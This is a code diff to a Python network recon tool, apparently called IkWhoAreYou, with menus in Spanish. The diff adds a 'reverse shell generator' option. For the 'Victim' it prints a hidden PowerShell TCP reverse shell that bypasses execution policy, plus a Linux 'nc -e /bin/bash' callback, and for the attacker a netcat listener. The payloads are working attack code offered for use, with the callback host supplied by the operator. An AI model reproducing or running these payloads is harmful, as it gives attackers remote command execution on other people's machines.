@@ -32,7 +32,7 @@ class Option:
 
 # Crear instancias de la clase Option
 normalmode = Option(1, 'Modo normal: ver IP, sistema operativo, versión de Windows, etc.')
-
+reverseshelloption = Option(2, 'Linux/Windows')
 # Inicializar colorama para la salida coloreada
 init(autoreset=True)
 
@@ -109,6 +109,30 @@ def option1_menu():
         print(f'Puerto encontrado: {puerto}')
     if check_system(ttl_output, ip_address):
         print('ITS WINDOWS!!!')
+
+def reverseshell(type, host, port):
+    if type == 'windows':
+        print(Fore.RESET)
+        print('''Victim: powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('''+host,''','''+str(port)+''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"''')
+        print(f'you: nc -lvnp {port}')
+    if type == 'linux':
+        print(
+f"""
+{Fore.CYAN}Linux command options:
+Victim:
+nc -e /bin/bash {host} {port}
+YOU:
+nc -lvnp {port}
+"""
+)
+    
+def option2_menu():
+    os.system('clear')
+    print(f'REVERSE SHELL GENERATOR')
+    type = input(f'{Fore.BLUE}Reverse system (Linux/Windows):{Fore.YELLOW}').lower()
+    host = input(f'{Fore.BLUE}Your tcp ip:{Fore.YELLOW}')
+    port = int(input(f'{Fore.BLUE}port: {Fore.YELLOW}'))
+    reverseshell(type,host,port)
     
 
 # Función para inicializar el menú principal
@@ -118,7 +142,7 @@ def init_menu():
         {Fore.RED}{Style.BRIGHT}========================== ¡Hola! Bienvenido a IkWhoAreYou =======================
 
         {Fore.BLUE}[1]:{Fore.YELLOW} Modo normal (ver IP, Linux/Mac o Windows, versión de Windows, etc)
-
+        {Fore.BLUE}[2]:{Fore.YELLOW} REVERSE SHELL (LINUX/WINDOWS)
         {Fore.RED}
         ================================================================================
         """
@@ -128,6 +152,8 @@ def init_menu():
         option_choice = int(input(f'{Fore.BLUE}Seleccione una opción:>{Fore.YELLOW} '))
         if normalmode.is_selected(option_choice):
             option1_menu()
+        elif reverseshelloption.is_selected(option_choice):
+            option2_menu()
         else:
             print('Error: Por favor, ingrese una opción válida.')
             sys.exit(1)
